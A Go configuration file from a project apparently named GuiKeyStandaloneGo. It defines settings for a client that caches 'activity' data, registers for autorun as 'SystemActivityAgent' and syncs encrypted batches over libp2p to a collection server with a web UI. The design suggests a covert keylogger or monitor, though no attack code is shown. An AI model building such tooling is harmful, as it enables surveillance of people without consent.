// GuiKeyStandaloneGo/pkg/config/models.go
package config

// For client_settings.toml (used by generator to structure data for client's embedded config)
type ClientSettings struct {
	ServerPeerID                       string   `toml:"server_peer_id"`
	EncryptionKeyHex                   string   `toml:"encryption_key_hex"`
	BootstrapAddresses                 []string `toml:"bootstrap_addresses"`
	ClientID                           string   `toml:"client_id"`
	SyncIntervalSecs                   uint64   `toml:"sync_interval"`
	ProcessorPeriodicFlushIntervalSecs uint64   `toml:"processor_periodic_flush_interval_secs"`
	InternalLogLevel                   string   `toml:"internal_log_level"`
	LogFilePath                        string   `toml:"log_file_path"` // For client's SQLite DB
	AppNameForAutorun                  string   `toml:"app_name_for_autorun"`
	LocalLogCacheRetentionDays         uint32   `toml:"local_log_cache_retention_days"`
	RetryIntervalOnFailSecs            uint64   `toml:"retry_interval_on_fail"`
	MaxRetriesPerBatch                 uint32   `toml:"max_retries_per_batch"`
	MaxLogFileSizeMB                   *uint64  `toml:"max_log_file_size_mb"`
	MaxEventsPerSyncBatch              int      `toml:"max_events_per_sync_batch"`
	InternalLogFileDir                 string   `toml:"internal_log_file_dir"`  // For client's diagnostic logs
	InternalLogFileName                string   `toml:"internal_log_file_name"` // For client's diagnostic logs
}

func DefaultClientSettings() ClientSettings {
	defaultSizeMB := uint64(56)
	return ClientSettings{
		ServerPeerID:     "",
		EncryptionKeyHex: "",
		BootstrapAddresses: []string{
			"/dnsaddr/bootstrap.libp2p.io/p2p/QmNnooDu7bfjPFoTZYxMNLWUQJyrVwtbZg5gBMjTezGAJN",
			"/dnsaddr/bootstrap.libp2p.io/p2p/QmQCU2EcMqAqQPR2i9bChDtGNJchTbq5TbXJJ16u19uLTa",
			"/dnsaddr/va1.bootstrap.libp2p.io/p2p/12D3KooWKnDdG3iXw9eTFijk3EWSunZcFi54Zka4wmtqtt6rPxc8",
			"/ip4/104.131.131.82/tcp/4001/p2p/QmaCpDMGvV2BGHeYERUEnRQAwe3N8SzbUtfsmvsqQLuvuJ",
		},
		ClientID:                           "",
		SyncIntervalSecs:                   60,
		ProcessorPeriodicFlushIntervalSecs: 120,
		InternalLogLevel:                   "info",
		LogFilePath:                        "activity_cache.sqlite",
		AppNameForAutorun:                  "SystemActivityAgent",
		LocalLogCacheRetentionDays:         7,
		RetryIntervalOnFailSecs:            60,
		MaxRetriesPerBatch:                 3,
		MaxLogFileSizeMB:                   &defaultSizeMB,
		MaxEventsPerSyncBatch:              200,
		InternalLogFileDir:                 "client_logs",
		InternalLogFileName:                "monitor_client_diag.log",
	}
}

// For local_server_config.toml (used by generator to structure data for server's embedded config)
type ServerSettings struct {
	ListenAddress               string   `toml:"listen_address"`
	WebUIListenAddress          string   `toml:"web_ui_listen_address"`
	EncryptionKeyHex            string   `toml:"encryption_key_hex"`
	ServerIdentityKeySeedHex    string   `toml:"server_identity_key_seed_hex"`
	DatabasePath                string   `toml:"database_path"`
	LogRetentionDays            uint32   `toml:"log_retention_days"`
	LogDeletionCheckIntervalHrs uint64   `toml:"log_deletion_check_interval_hours"`
	BootstrapAddresses          []string `toml:"bootstrap_addresses,omitempty"`
	InternalLogLevel            string   `toml:"internal_log_level,omitempty"`     // <<< THIS FIELD MUST BE HERE
	InternalLogFileDir          string   `toml:"internal_log_file_dir,omitempty"`  // <<< THIS FIELD MUST BE HERE
	InternalLogFileName         string   `toml:"internal_log_file_name,omitempty"` // <<< THIS FIELD MUST BE HERE
}

func DefaultServerSettings() ServerSettings {
	return ServerSettings{
		ListenAddress:               "/ip4/0.0.0.0/tcp/0",
		WebUIListenAddress:          "0.0.0.0:8090",
		EncryptionKeyHex:            "",
		ServerIdentityKeySeedHex:    "",
		DatabasePath:                "activity_server.sqlite",
		LogRetentionDays:            30,
		LogDeletionCheckIntervalHrs: 24,
		BootstrapAddresses:          []string{},
		InternalLogLevel:            "info",                  // <<< AND INITIALIZED HERE
		InternalLogFileDir:          "server_logs",           // <<< AND INITIALIZED HERE
		InternalLogFileName:         "local_server_diag.log", // <<< AND INITIALIZED HERE
	}
}
